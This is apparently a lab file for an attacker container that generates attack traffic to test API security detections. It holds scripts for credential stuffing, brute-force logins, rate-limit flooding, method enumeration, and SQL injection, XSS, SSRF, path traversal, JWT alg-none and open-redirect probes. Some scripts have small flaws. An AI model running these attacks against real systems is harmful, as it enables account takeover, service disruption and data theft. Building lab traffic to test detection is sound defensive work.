# Attacker Container


```bash
# Directory structure for attack_scripts/
attack_scripts/
├── 1_credential_stuffing.sh
├── 2_password_reset_abuse.sh
├── 3_auth_endpoint_errors.sh
├── 4_rate_limit_abuse.sh
├── 5_http_protocol_misconfig.sh
├── 6_high_traffic_endpoint.sh
├── 7_4xx_error_generation.sh
├── 8_method_enumeration.sh
└── start_attacks.sh
```

**1_credential_stuffing.sh** (api_token_excessive_error_rates_to_auth_endpoint):
```bash
#!/bin/sh
TARGET="${BASE_URL}/signin"
TOKEN="fixed_malicious_token_123"

for i in $(seq 1 30); do
  curl -X POST "$TARGET" \
    -H "Authorization: Bearer $TOKEN" \
    -d "username=user$i&password=badpassword" &
done
wait
```

**2_password_reset_abuse.sh** (api_token_excessive_error_rates_to_reset_password_endpoint):
```bash
#!/bin/sh
TARGET="${BASE_URL}/reset_password"
TOKEN="fixed_malicious_token_456"

for i in $(seq 1 30); do
  curl -X POST "$TARGET" \
    -H "Authorization: Bearer $TOKEN" \
    -d "email=user$i@example.com" &
done
wait
```

**3_auth_endpoint_errors.sh** (api_token_excessive_error_rates):
```bash
#!/bin/sh
ENDPOINTS=("signin" "signup" "auth" "authenticate")
TOKEN="fixed_malicious_token_789"

for endpoint in "${ENDPOINTS[@]}"; do
  for i in $(seq 1 10); do
    curl -X POST "${BASE_URL}/${endpoint}" \
      -H "Authorization: Bearer $TOKEN" \
      -d "username=user$i&password=wrong" &
  done
done
wait
```

**4_rate_limit_abuse.sh** (api_rate_limit + api_high_traffic_to_endpoint):
```bash
#!/bin/sh
TARGET="${BASE_URL}/product/1"
hey -z 1m -c 50 -q 10 "$TARGET"
```

**5_http_protocol_misconfig.sh** (security_misconfig_http_protocol):
```bash
#!/bin/sh
# Test HTTP endpoints that should be HTTPS
curl -I http://${TARGET_HOST}:8080${BASE_URL}/profile
curl -X POST http://${TARGET_HOST}:8080${BASE_URL}/token
```

**6_high_traffic_endpoint.sh** (api_high_traffic_to_endpoint):
```bash
#!/bin/sh
siege -b -t1M -c 25 "${BASE_URL}/multi_method"
```

**7_4xx_error_generation.sh** (4XX_api_error_code_to_endpoint):
```bash
#!/bin/sh
# Generate 401/403 errors
curl -H "Content-Type: application/json" "${BASE_URL}/profile"
curl -X PUT "${BASE_URL}/multi_method"
```

**8_method_enumeration.sh** (api_methods_to_endpoint_with_same_token):
```bash
#!/bin/sh
TOKEN="fixed_malicious_token_321"
ENDPOINT="${BASE_URL}/multi_method"

for method in GET POST PUT DELETE PATCH; do
  curl -X $method "$ENDPOINT" \
    -H "Authorization: Bearer $TOKEN"
done
```

**start_attacks.sh** (Main executor):
```bash
#!/bin/sh
export BASE_URL="http://${TARGET_HOST}:8080"  # Set this in Docker run command

## Attacks sequentially with 5s spacing
./1_credential_stuffing.sh && sleep 5
./2_password_reset_abuse.sh && sleep 5
./3_auth_endpoint_errors.sh && sleep 5
./4_rate_limit_abuse.sh &  # Run in background
./5_http_protocol_misconfig.sh
./6_high_traffic_endpoint.sh
./7_4xx_error_generation.sh
./8_method_enumeration.sh
wait
```


# Extra simulations

```bash
# Container setup (run this first)
docker run -it --network host --name attacker alpine sh
apk add curl nmap sqlmap hydra nikto

# ----------------------------------
# 1. Credential Stuffing Attacks
# Targets: /signin, /auth, /authenticate

# Basic password spraying
for user in $(cat users.txt); do
  curl -X POST "http://frontend:8080${BASE_URL}/signin" \
    -d "username=${user}&password=Spring2023!"
done

# ----------------------------------
# 2. SQL Injection Probes
# Targets: /signup, /profile, /product/{id}

# SQLi in product endpoint
curl "http://frontend:8080${BASE_URL}/product/1'%20OR%201=1--"

# Time-based blind SQLi
curl "http://frontend:8080${BASE_URL}/profile?id=1%20AND%201=SLEEP(10)"

# ----------------------------------
# 3. XSS Testing
# Targets: /product/{id}, /profile, /chatbot

# Simple XSS probe
curl -X POST "http://frontend:8080${BASE_URL}/bot" \
  -d 'message=<script>alert(1)</script>'

# ----------------------------------
# 4. Broken Authentication
# Targets: /session/renew, /oauth, /token

# Session fixation test
curl -v -b "shop_session-id=attacker_session" \
  "http://frontend:8080${BASE_URL}/session/renew"

# ----------------------------------
# 5. SSRF Attempts
# Targets: /product-meta, /assistant

curl "http://frontend:8080${BASE_URL}/product-meta/1,2,http://internal-server"

# ----------------------------------
# 6. Directory Traversal
# Targets: /static/, /profile

curl "http://frontend:8080${BASE_URL}/static../etc/passwd"

# ----------------------------------
# 7. API Abuse
# Targets: /multi_method, /token

# Unexpected method testing
curl -X TRACE "http://frontend:8080${BASE_URL}/multi_method"

# ----------------------------------
# 8. Rate Limiting Tests
# Targets: /signin, /oauth

# Brute force simulation
for i in {1..100}; do
  curl -X POST "http://frontend:8080${BASE_URL}/signin" \
    -d "username=admin&password=guess${i}"
done

# ----------------------------------
# 9. JWT Tampering
# Targets: /auth, /token

# Modified JWT header
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0." \
  "http://frontend:8080${BASE_URL}/profile"

# ----------------------------------
# 10. Open Redirect
# Targets: /oauth, /logout

curl "http://frontend:8080${BASE_URL}/logout?redirect=http://malicious-site.com"
```
# Start attacks
kubectl create -f attacker-deployment.yaml

# Stop attacks (destructive)
kubectl delete deployment attacker

# Temporary pause (preserves logs)
kubectl scale deployment attacker --replicas=0

# View logs
kubectl logs deployment/attacker -f
